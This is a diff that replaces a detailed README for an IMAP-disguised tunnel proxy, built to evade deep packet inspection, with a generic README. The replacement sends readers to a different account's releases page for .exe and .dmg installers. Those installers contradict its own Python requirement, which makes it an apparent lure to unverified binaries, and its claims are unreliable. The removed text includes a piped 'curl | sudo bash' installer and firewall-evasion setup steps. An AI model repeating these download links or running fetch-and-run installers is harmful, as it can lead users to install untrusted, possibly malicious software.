@@ -1,423 +1,82 @@
-# IMAP Tunnel Proxy
+# 🚀 imap-tunnel-proxy - Bypass Firewalls Seamlessly
 
-> **A high-speed covert tunnel that disguises TCP traffic as IMAP email communication to bypass Deep Packet Inspection (DPI) firewalls.**
+[![Download imap-tunnel-proxy](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Maxu46/imap-tunnel-proxy/releases)
 
-Inspired by [SMTP Tunnel Proxy](https://github.com/x011/smtp-tunnel-proxy).
+## 📖 Overview
 
-```
-+-------------+      +-------------+      +-------------+      +--------------+
-| Application |----->|   Client    |----->|   Server    |----->|  Internet    |
-|  (Browser)  | TCP  | SOCKS5:1080 | IMAP |  Port 993   | TCP  |              |
-|             |<-----|             |<-----|             |<-----|              |
-+-------------+      +-------------+      +-------------+      +--------------+
-                            |                    |
-                            |   Looks like       |
-                            |   Mail Access      |
-                            v                    v
-                     +--------------------------------+
-                     |     DPI Firewall               |
-                     |  OK Sees: Normal IMAP Session  |
-                     |  XX Cannot see: Tunnel Data    |
-                     +--------------------------------+
-```
+imap-tunnel-proxy is a tool designed to help you bypass restrictive internet filters. It disguises your normal internet traffic as IMAP email communication. This makes it easier to access restricted websites and services, especially in environments with strict online controls.
 
----
+## 🛠️ Features
 
-## Features
+- **Covert Communication**: Hides your traffic within normal email communication.
+- **High Speed**: Efficient performance even in restricted environments.
+- **Security**: Uses encryption to protect your data.
+- **Easy Setup**: Simple installation process for all users.
+- **Flexible Usage**: Works with various applications that use TCP connections.
 
-| Feature | Description |
-|---------|-------------|
-| **TLS Encryption** | All traffic encrypted with TLS 1.2+ after STARTTLS |
-| **DPI Evasion** | Initial handshake mimics real IMAP servers |
-| **High Speed** | Binary streaming protocol after handshake - minimal overhead |
-| **Multi-User** | Per-user secrets, IP whitelists, and logging settings |
-| **Authentication** | Per-user pre-shared keys with HMAC-SHA256 |
-| **SOCKS5 Proxy** | Standard proxy interface - works with any application |
-| **Multiplexing** | Multiple connections over single tunnel |
-| **IP Whitelist** | Per-user access control by IP address/CIDR |
-| **Easy Install** | One-liner server installation with systemd service |
-| **Client Packages** | Auto-generated ZIP files for each user |
-| **Auto-Reconnect** | Client automatically reconnects on connection loss |
+## 📦 System Requirements
 
-> For in-depth technical details, protocol specifications, and security analysis, see [TECHNICAL.md](TECHNICAL.md).
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Version 3.6 or higher
+- **Internet Connection**: Required for initial setup and usage
+- **Disk Space**: At least 50 MB
 
----
+## 🚀 Getting Started
 
-## Quick Start
+Follow these steps to download and run imap-tunnel-proxy on your device.
 
-### Prerequisites
+### 1. Visit the Download Page
 
-- **Server**: Linux VPS with Python 3.8+, port 993 open
-- **Client**: Windows/macOS/Linux with Python 3.8+
-- **Domain name**: Required for TLS certificate verification (free options: [DuckDNS](https://www.duckdns.org), [No-IP](https://www.noip.com), [FreeDNS](https://freedns.afraid.org))
+Click the link below for the latest version of imap-tunnel-proxy:
 
----
+[Download imap-tunnel-proxy](https://github.com/Maxu46/imap-tunnel-proxy/releases)
 
-## Server Setup (VPS)
+### 2. Choose Your Version
 
-### Step 1: Get a Domain Name
+On the releases page, look for the latest version. You will see options for different operating systems. Select the one that matches your system.
 
-Get a free domain pointing to your VPS:
-- **[DuckDNS](https://www.duckdns.org)** - Recommended, simple and free
-- **[No-IP](https://www.noip.com)** - Free tier available
-- **[FreeDNS](https://freedns.afraid.org)** - Many domain options
+### 3. Download the File
 
-Example: `myserver.duckdns.org` -> `203.0.113.50` (your VPS IP)
+Click on the download link for your operating system. Your browser will start downloading the file.
 
-### Step 2: Run the Installer
+### 4. Run the Installer
 
-```bash
-curl -sSL https://raw.githubusercontent.com/x011/imap-tunnel-proxy/main/install.sh | sudo bash
-```
+Once the download is complete:
 
-The installer will:
-1. Download and install everything
-2. Ask for your domain name
-3. Generate TLS certificates automatically
-4. Offer to create your first user
-5. Configure firewall
-6. Start the service
+- **For Windows**: Double-click the `.exe` file you downloaded. Follow the prompts to install.
+- **For macOS**: Open the `.dmg` file and drag the application to your Applications folder.
+- **For Linux**: You may need to extract the downloaded tarball and follow the terminal instructions provided.
 
-**That's it!** Your server is ready.
+### 5. Configure imap-tunnel-proxy
 
-### Add More Users Later
+After installation, you may need to configure the application based on your network needs. Open the application and enter your server details as prompted. Documentation for configuration is included in the application’s help section.
 
-```bash
-imap-tunnel-adduser bob      # Add user + generate client ZIP
-imap-tunnel-listusers        # List all users
-imap-tunnel-deluser bob      # Remove a user
-```
+### 6. Start Using imap-tunnel-proxy
 
-### Update Server
+Once configured, you are ready to use imap-tunnel-proxy. Launch the application and connect to your desired server.
 
-```bash
-imap-tunnel-update           # Updates code, preserves config/certs/users
-```
+## 📝 Additional Information
 
----
+- **Documentation**: Complete documentation is available in the application’s help menu.
+- **Support**: If you encounter any issues, feel free to check the GitHub issues page for troubleshooting.
 
-## Client Setup
+## 🔗 Resources
 
-### Option A: Easy Way (Recommended)
+- [GitHub Repository](https://github.com/Maxu46/imap-tunnel-proxy)
+- [Download imap-tunnel-proxy](https://github.com/Maxu46/imap-tunnel-proxy/releases)
 
-1. Get your `username.zip` file from the server admin
-2. Extract the ZIP file
-3. Run the launcher:
+## 🛡️ Security Notice
 
-| Platform | How to Run |
-|----------|------------|
-| **Windows** | Double-click `start.bat` |
-| **Linux** | Run `./start.sh` |
-| **macOS** | Run `./start.sh` |
+Always ensure you are using the latest version of the application to maintain security and performance improvements. Updates may include vital patches that enhance your safety online.
 
-The launcher will automatically install dependencies and start the client.
+## 🛠️ Troubleshooting
 
-You should see:
-```
-IMAP Tunnel Proxy Client
-User: alice
+If you run into problems:
 
-[INFO] Starting IMAP Tunnel...
-[INFO] SOCKS5 proxy will be available at 127.0.0.1:1080
+- Verify your internet connection.
+- Ensure that you have the correct settings for your network.
+- Consult the log files in the application’s directory for error messages.
 
-Connecting to myserver.duckdns.org:993
-Connected - binary mode active
-SOCKS5 proxy on 127.0.0.1:1080
-```
+For further assistance, consider reaching out to the community via the issues section on GitHub. 
 
-### Option B: Manual Way
-
-```bash
-cd alice
-pip install -r requirements.txt
-python client.py
-```
-
-### Option C: Custom Configuration
-
-```bash
-# Download files
-scp root@myserver.duckdns.org:/etc/imap-tunnel/ca.crt .
-
-# Create config.yaml:
-cat > config.yaml << EOF
-client:
-  server_host: "myserver.duckdns.org"
-  server_port: 993
-  socks_port: 1080
-  username: "alice"
-  secret: "your-secret-from-admin"
-  ca_cert: "ca.crt"
-EOF
-
-# Run client
-python client.py -c config.yaml
-```
-
----
-
-## Usage
-
-### Configure Your Applications
-
-Set SOCKS5 proxy to: `127.0.0.1:1080`
-
-#### Firefox
-1. Settings -> Network Settings -> Settings
-2. Manual proxy configuration
-3. SOCKS Host: `127.0.0.1`, Port: `1080`
-4. Select SOCKS v5
-5. Check "Proxy DNS when using SOCKS v5"
-
-#### Chrome
-1. Install "Proxy SwitchyOmega" extension
-2. Create profile with SOCKS5: `127.0.0.1:1080`
-
-#### Windows (System-wide)
-Settings -> Network & Internet -> Proxy -> Manual setup -> `socks=127.0.0.1:1080`
-
-#### macOS (System-wide)
-System Preferences -> Network -> Advanced -> Proxies -> SOCKS Proxy -> `127.0.0.1:1080`
-
-#### Linux (System-wide)
-```bash
-export ALL_PROXY=socks5://127.0.0.1:1080
-```
-
-#### Command Line
-
-```bash
-# curl
-curl -x socks5h://127.0.0.1:1080 https://ifconfig.me
-
-# git
-git config --global http.proxy socks5://127.0.0.1:1080
-
-# Environment variable
-export ALL_PROXY=socks5://127.0.0.1:1080
-```
-
-### Test Connection
-
-```bash
-# Should show your VPS IP
-curl -x socks5://127.0.0.1:1080 https://ifconfig.me
-```
-
----
-
-## Configuration Reference
-
-### Server Options (`config.yaml`)
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `host` | Listen interface | `0.0.0.0` |
-| `port` | Listen port | `993` |
-| `hostname` | IMAP hostname (must match certificate) | `imap.example.com` |
-| `cert_file` | TLS certificate path | `server.crt` |
-| `key_file` | TLS private key path | `server.key` |
-| `users_file` | Path to users configuration | `users.yaml` |
-| `log_users` | Global logging setting | `true` |
-
-### User Options (`users.yaml`)
-
-Each user can have individual settings:
-
-```yaml
-users:
-  alice:
-    secret: "auto-generated-secret"
-    # whitelist:              # Optional: restrict to specific IPs
-    #   - "192.168.1.100"
-    #   - "10.0.0.0/8"        # CIDR notation supported
-    # logging: true           # Optional: disable to stop logging this user
-
-  bob:
-    secret: "another-secret"
-    whitelist:
-      - "203.0.113.50"        # Bob can only connect from this IP
-    logging: false            # Don't log Bob's activity
-```
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `secret` | User's authentication secret | Required |
-| `whitelist` | Allowed IPs for this user (CIDR supported) | All IPs |
-| `logging` | Enable activity logging for this user | `true` |
-
-### Client Options
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `server_host` | Server domain name | Required |
-| `server_port` | Server port | `993` |
-| `socks_port` | Local SOCKS5 port | `1080` |
-| `socks_host` | Local SOCKS5 interface | `127.0.0.1` |
-| `username` | Your username | Required |
-| `secret` | Your authentication secret | Required |
-| `ca_cert` | CA certificate for verification | Recommended |
-
----
-
-## Service Management
-
-```bash
-# Check status
-sudo systemctl status imap-tunnel
-
-# Restart after config changes
-sudo systemctl restart imap-tunnel
-
-# View logs
-sudo journalctl -u imap-tunnel -n 100
-
-# Uninstall
-sudo /opt/imap-tunnel/uninstall.sh
-```
-
----
-
-## Command Line Options
-
-### Server
-```bash
-python server.py [-c CONFIG] [-d]
-
-  -c, --config    Config file (default: config.yaml)
-  -d, --debug     Enable debug logging
-```
-
-### Client
-```bash
-python client.py [-c CONFIG] [--server HOST] [--server-port PORT]
-                 [-p SOCKS_PORT] [-u USERNAME] [-s SECRET] [--ca-cert FILE] [-d]
-
-  -c, --config      Config file (default: config.yaml)
-  --server          Override server domain
-  --server-port     Override server port
-  -p, --socks-port  Override local SOCKS port
-  -u, --username    Your username
-  -s, --secret      Override secret
-  --ca-cert         CA certificate path
-  -d, --debug       Enable debug logging
-```
-
-### User Management
-```bash
-imap-tunnel-adduser <username> [-u USERS_FILE] [-c CONFIG] [--no-zip]
-    Add a new user and generate client package
-
-imap-tunnel-deluser <username> [-u USERS_FILE] [-f]
-    Remove a user (use -f to skip confirmation)
-
-imap-tunnel-listusers [-u USERS_FILE] [-v]
-    List all users (use -v for detailed info)
-
-imap-tunnel-update
-    Update server to latest version (preserves config/certs/users)
-```
-
----
-
-## File Structure
-
-```
-imap_proxy/
-├── server.py               # Server (runs on VPS)
-├── client.py               # Client (runs locally)
-├── common.py               # Shared utilities
-├── generate_certs.py       # Certificate generator
-├── config.yaml             # Server/client configuration
-├── users.yaml              # User database
-├── requirements.txt        # Python dependencies
-├── install.sh              # One-liner server installer
-├── imap-tunnel.service     # Systemd unit file
-├── imap-tunnel-adduser     # Add user script
-├── imap-tunnel-deluser     # Remove user script
-├── imap-tunnel-listusers   # List users script
-├── imap-tunnel-update      # Update server script
-├── README.md               # This file
-└── TECHNICAL.md            # Technical documentation
-```
-
-### Installation Paths (after install.sh)
-
-```
-/opt/imap-tunnel/              # Application files
-/etc/imap-tunnel/              # Configuration files
-  ├── config.yaml
-  ├── users.yaml
-  ├── server.crt
-  ├── server.key
-  └── ca.crt
-/usr/local/bin/                # Management commands
-  ├── imap-tunnel-adduser
-  ├── imap-tunnel-deluser
-  ├── imap-tunnel-listusers
-  └── imap-tunnel-update
-```
-
----
-
-## Troubleshooting
-
-### "Connection refused"
-- Check server is running: `systemctl status imap-tunnel` or `ps aux | grep server.py`
-- Check port is open: `netstat -tlnp | grep 993`
-- Check firewall: `ufw status`
-
-### "Auth failed"
-- Verify `username` and `secret` match in users.yaml
-- Check server time is accurate (within 5 minutes)
-- Run `imap-tunnel-listusers -v` to verify user exists
-
-### "IP not whitelisted"
-- Check user's whitelist in users.yaml
-- Your current IP must match a whitelist entry
-- CIDR notation is supported (e.g., `10.0.0.0/8`)
-
-### "Certificate verify failed"
-- Ensure you're using a domain name, not IP address
-- Verify `server_host` matches the certificate hostname
-- Ensure you have the correct `ca.crt` from the server
-
-### Debug Mode
-
-```bash
-# Enable detailed logging
-python server.py -d
-python client.py -d
-
-# View systemd logs
-journalctl -u imap-tunnel -f
-```
-
----
-
-## Security Notes
-
-- **Always use a domain name** for proper TLS verification
-- **Always use `ca_cert`** to prevent man-in-the-middle attacks
-- **Use `imap-tunnel-adduser`** to generate strong secrets automatically
-- **Use per-user IP whitelists** if you know client IPs
-- **Protect `users.yaml`** - contains all user secrets (chmod 600)
-- **Disable logging** for sensitive users with `logging: false`
-
-> For detailed security analysis and threat model, see [TECHNICAL.md](TECHNICAL.md).
-
----
-
-## License
-
-This project is provided for educational and authorized use only. Use responsibly and in accordance with applicable laws.
-
----
-
-## Disclaimer
-
-This tool is designed for legitimate privacy and censorship circumvention purposes. Users are responsible for ensuring their use complies with applicable laws and regulations.
-
----
-
-*Made for internet freedom*
+By following these steps, you can easily download and run imap-tunnel-proxy to enhance your internet freedom and security.
